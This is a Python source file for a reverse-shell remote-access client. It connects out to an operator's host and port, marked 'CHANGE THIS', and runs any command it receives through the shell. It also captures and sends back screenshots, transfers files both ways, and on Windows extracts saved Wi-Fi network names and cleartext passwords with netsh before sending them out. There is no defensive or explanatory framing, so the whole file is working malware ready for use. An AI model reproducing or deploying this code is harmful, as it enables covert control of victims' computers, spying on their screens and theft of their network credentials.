import socket
import subprocess
import os
import getpass
import locale
import platform
try:
    from PIL import ImageGrab
except ImportError:
    pass
import pyscreenshot as img_grab
import string
import random

def id_gen(size=7, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for c in range(size))
    
def main():
    host = '127.0.0.1' # CHANGE THIS
    port = 4747        # CHANGE THIS
    connection = 0
    lang = locale.getlocale()[0]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
    except ConnectionRefusedError:
        connection = 1
        print("[x] Connection refused")
   
       
    if connection == 0:
        hostname = socket.gethostname()
        username = getpass.getuser()
        osys = platform.system()
        osv = platform.release()
        while True:
            try:
                data = s.recv(20480)
            except ConnectionResetError:
                pass
            except OSError:
                break
            datad = data.decode("utf-8")

            if datad.strip() == "prompt":
                pass
                
            if datad.strip() == "CLOSEALL":
                s.close()
                break
            try:
                if datad[:2].strip() == 'cd':
                    os.chdir(datad[3:].strip())
            except FileNotFoundError:
                pass
            except OSError:
                pass

            if datad.strip() == " ":
                pass

            if datad.strip() == 'screenshot':
                if osys == "Linux":
                    img = img_grab.grab()
                else:
                    img = ImageGrab.grab()
                filename = 'screen-'+id_gen()+'.png'
                img.save(filename)
                s.send(str.encode('EXISTS ' + str(os.path.getsize(filename))))
                userResp = s.recv(1024)
                userRespd = userResp.decode('utf-8')
                if userRespd[:2] == 'OK':
                    with open(filename, 'rb') as (f):
                        byteSend = f.read(1024)
                        s.send(byteSend)
                        while byteSend != b'':
                            byteSend = f.read(1024)
                            s.send(byteSend)
                if osys == 'Windows':
                    os.system("del " + filename)          
                else:
                    os.system("rm " + filename)
                continue
                    
            if datad.strip() == "download":
                filename = s.recv(1024).decode("utf-8")
                if os.path.isfile(filename):
                    s.send(str.encode('EXISTS ' + str(os.path.getsize(filename))))
                    userResp = s.recv(1024)
                    userRespd = userResp.decode('utf-8')
                    if userRespd[:2] == 'OK':
                        with open(filename, 'rb') as (f):
                            byteSend = f.read(1024)
                            s.send(byteSend)
                            while byteSend != b'':
                                byteSend = f.read(1024)
                                s.send(byteSend)
                            continue
                        
                else:
                    s.send(str.encode('ERR'))
                    continue

            if datad.strip() == "upload":
                filename = s.recv(1024).decode("utf-8")
                res = s.recv(1024).decode("utf-8")
                if res[:6] == 'EXISTS':
                    filesize = int(res[6:])
                    s.send(str.encode('OK'))
                    f = open('new_' + filename, 'wb')
                    err = s.recv(1024)
                    totalRecv = len(err)
                    f.write(err)
                    while totalRecv < filesize:
                        err = s.recv(1024)
                        totalRecv += len(err)
                        f.write(err)
                    f.close()
                    continue
                if res[:3] == "ERR":
                    continue
            

            
            if datad.strip() == 'get_wifi':
                try:
                    if osys == "Windows":
                        if lang == "Italian_Italy":
                            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('windows-1252').split('\n')
                            wifis = [line.split(':')[1][1:-1] for line in data if "Tutti i profili utente" in line]

                            for wifi in wifis:
                                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('windows-1252').split('\n')
                                results = [line.split(':')[1][1:-1] for line in results if "Contenuto chiave" in line]
                                with open("local.txt", 'a') as f:
                                    try:
                                        f.write(f'SSID: {wifi}, Password: {results[0]}\n')
                                    except IndexError:
                                        f.write(f'SSID: {wifi}, Password: Impossibile leggere la password!\n')

                        else:
                            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('windows-1252').split('\n')
                            wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

                            for wifi in wifis:
                                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('windows-1252').split('\n')
                                results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
                                with open("local.txt", 'a') as f:
                                    try:
                                        f.write(f'SSID: {wifi}, Password: {results[0]}\n')
                                    except IndexError:
                                        f.write(f'SSID: {wifi}, Password: Cannot be read!\n')

                        s.send(str.encode('EXISTS ' + str(os.path.getsize("local.txt"))))
                        userResp = s.recv(1024)
                        userRespd = userResp.decode('utf-8')
                        if userRespd[:2] == 'OK':
                            with open("local.txt", 'rb') as (f):
                                byteSend = f.read(1024)
                                s.send(byteSend)
                                while byteSend != b'':
                                    byteSend = f.read(1024)
                                    s.send(byteSend)
                        if osys == 'Windows':
                            os.system("del local.txt")          
                        else:
                            os.system("rm local.txt")
                        continue
                    else:
                        s.send("err".encode())
                        continue
                except:
                    s.send("errw".encode())
                    continue

            if len(data) > 0:
                sh = subprocess.Popen(datad, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                out = sh.stdout.read()
                if osys == 'Windows':
                    outstr = str(out, "windows-1252")
                else:
                    outstr = str(out, "utf-8")
                try:
                    s.send(str.encode(outstr + '[ ' + username + '@' + hostname + ' ] ' + os.getcwd() + '> '))
                except ConnectionResetError:
                    break
            else:
                s.close()
           
if __name__ == "__main__":
    main()
